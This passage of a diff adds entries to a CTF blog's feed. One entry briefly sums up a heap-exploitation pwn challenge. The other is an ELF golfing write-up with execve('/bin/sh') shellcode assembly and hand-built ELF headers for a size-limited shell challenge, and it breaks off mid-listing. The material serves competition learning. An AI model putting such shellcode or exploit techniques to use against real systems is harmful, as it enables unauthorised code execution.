+archive link: &lt;a href=&quot;https://github.com/sajjadium/ctf-archives/tree/main/ctfs/0xL4ugh/2024/pwn/pwn1&quot; target=&quot;_blank&quot;&gt;https://github.com/sajjadium/ctf-archives/tree/main/ctfs/0xL4ugh/2024/pwn/pwn1&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;comments: only 1 pwn challenge on this ctf. cakewalk challenge honestly.&lt;/p&gt;
+
+&lt;h2 id=&quot;pwn1&quot;&gt;pwn1&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;h3 id=&quot;difficulty-410&quot;&gt;Difficulty: 4/10&lt;/h3&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;summary: UAF =&amp;gt; tcache poisoning to overwrite free_hook with system
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;writeup link: &lt;a href=&quot;https://github.com/kh4rg0sh/project-2024/tree/main/pwn1&quot; target=&quot;_blank&quot;&gt;https://github.com/kh4rg0sh/project-2024/tree/main/pwn1&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;comments: pretty standard challenge and in my opinion, a very poorly written challenge. even though, im suppose to be rating heap challenges atleast a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6/10&lt;/code&gt; but this challenge felt pretty stupid. i dont know if it’s either the challenge’s fault or if i’m getting better, but this was really straightforward. i’ve performed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcache poisoning&lt;/code&gt; on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc 2.31&lt;/code&gt; in a very similar setup (or maybe a bit more constrained setting) as this challenge so this didn’t feel difficult at all. hence, i’m rating this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4/10&lt;/code&gt;. what a no brainer!&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>ELF Golfing</title>
+   <link href="http://localhost:4000/2024/10/06/elf-golfing/"/>
+   <updated>2024-10-06T00:00:00+05:30</updated>
+   <id>http://localhost:4000/2024/10/06/elf-golfing</id>
+   <content type="html">&lt;p&gt;I participated in &lt;a href=&quot;https://ctftime.org/event/2389/&quot; target=&quot;_blank&quot;&gt;BRICS+ CTF Quals 2024&lt;/a&gt; yesterday. One of the challenges was about &lt;em&gt;ELF golfing&lt;/em&gt;, and I found it quite interesting.&lt;/p&gt;
+
+&lt;p&gt;For those who aren’t familiar with what this business is all about, here’s a quick introduction.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-idea-of-code-golf&quot;&gt;The idea of Code Golf&lt;/h3&gt;
+
+&lt;p&gt;Code golfing refers to minimizing the size of a program (in bytes) while still performing a task.&lt;/p&gt;
+
+&lt;h3 id=&quot;what-are-elf-files&quot;&gt;What are ELF files?&lt;/h3&gt;
+
+&lt;p&gt;ELF is the standard executable file format on Linux. It has a defined structure and headers that tell the operating system how to load and run the program.&lt;/p&gt;
+
+&lt;p&gt;So, when we talk about &lt;em&gt;ELF golfing&lt;/em&gt;, we mean minimizing the size of the final executable binary. That was the essence of this challenge.&lt;/p&gt;
+
+&lt;p&gt;I’ll post my write up for the challenge now.&lt;/p&gt;
+
+&lt;h1 id=&quot;shelfing-173-solves&quot;&gt;shELFing [173 solves]&lt;/h1&gt;
+&lt;h2 id=&quot;challenge&quot;&gt;Challenge&lt;/h2&gt;
+&lt;p&gt;here’s a brief of the challenge in just words. your goal is to supply an executable to the remote server, such that the size of the executable does not exceed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;76 bytes&lt;/code&gt; and we should be able to pop a shell with that.&lt;/p&gt;
+
+&lt;h1 id=&quot;solution&quot;&gt;Solution&lt;/h1&gt;
+&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;
+&lt;p&gt;it’s clear from the challenge statement that we need to do an ELF golfing. so i googled up ELF golfing and found out this nice article:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;however, this article describes how to golf the following piece of code&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;as opposed to what we desire&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;if you were to simply compile this program with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc&lt;/code&gt;. the executable size is over &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;20000&lt;/code&gt; bytes. humongous as compared to the target size: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;76 bytes&lt;/code&gt;!&lt;/p&gt;
+&lt;h2 id=&quot;assembly-to-drop-a-shell&quot;&gt;Assembly to Drop a Shell&lt;/h2&gt;
+&lt;p&gt;how about we start with the assembly that just invokes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall execve()&lt;/code&gt;. i wrote a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64-bit intel assembly&lt;/code&gt; to do the same&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;section .data
+    msg: db &quot;/bin/sh&quot;, 0
+
+section .text
+    global _start
+
+_start:
+    xor rax, rax
+    mov rdi, msg
+    mov rsi, rax
+    mov rdx, rax
+    mov rax, 59
+    syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;to generate an executable we assemble this using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nasm&lt;/code&gt; and link it using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nasm &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; elf64 shell.s
+ld shell.o &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shell
+./shell
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;it seems to work fine. lets’s check the size of the executable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; shell
+8832 &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;|
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8832&lt;/code&gt; bytes is a really huge number. so we have no other choice than to resort to writing out our own ELF header.&lt;/p&gt;
+
+&lt;h2 id=&quot;64-bit-elf&quot;&gt;64-bit ELF&lt;/h2&gt;
+&lt;p&gt;an ELF comprises of four major components:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;ELF Header&lt;/li&gt;
+  &lt;li&gt;Program Header&lt;/li&gt;
+  &lt;li&gt;Sections&lt;/li&gt;
+  &lt;li&gt;Section Header&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;quoting from https://gist.github.com/x0nu11byt3/bcb35c3de461e5fb66173071a2379779
+“he program header table provides a segment view of the binary, as opposed to the section view provided by the section header table. The section view of an ELF binary, is meant for static-linking purposes only.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In contrast, the segment view, is used by the operating system and dynamic-linker when loading an ELF into a process for execution to locate the relevant code and data and decide what to load into virtual memory.”&lt;/p&gt;
+
+&lt;p&gt;and as mentioned in the article, it’s not harmful to drop the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Section Header&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;we still however absolutely need the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELF Header&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Program Header&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;elf-header-64-bit&quot;&gt;ELF Header (64-bit)&lt;/h3&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e_ident&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EI_NIDENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Magic number and other info */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Half&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;			&lt;span class=&quot;cm&quot;&gt;/* Object file type */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Half&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e_machine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Architecture */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Word&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Object file version */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Addr&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Entry point virtual address */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Off&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e_phoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Program header table file offset */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Off&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e_shoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Section header table file offset */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Word&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Processor-specific flags */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Half&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e_ehsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* ELF header size in bytes */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Half&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e_phentsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Program header table entry size */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Half&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e_phnum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Program header table entry count */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Half&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e_shentsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Section header table entry size */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Half&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e_shnum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Section header table entry count */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Half&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e_shstrndx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Section header string table index */&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf64_Ehdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;program-header-64-bit&quot;&gt;Program Header (64-bit)&lt;/h3&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Word&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;p_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;			&lt;span class=&quot;cm&quot;&gt;/* Segment type */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Word&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;p_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Segment flags */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Off&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;p_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Segment file offset */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Addr&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;p_vaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Segment virtual address */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Addr&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;p_paddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Segment physical address */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Xword&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;p_filesz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Segment size in file */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Xword&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;p_memsz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Segment size in memory */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Elf64_Xword&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;p_align&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Segment alignment */&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf64_Phdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;using the above mentioned formats, i crafted the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ehdr&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phdr&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-s highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;bits&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400000&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ehdr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ELF&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dw&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dw&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;phdr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dw&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ehdrsize&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dw&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;phdrsize&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dw&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dw&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dw&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dw&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ehdrsize&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;equ&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ehdr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;phdr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filesize&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filesize&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;phdrsize&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;equ&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;phdr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;section&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;.data&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
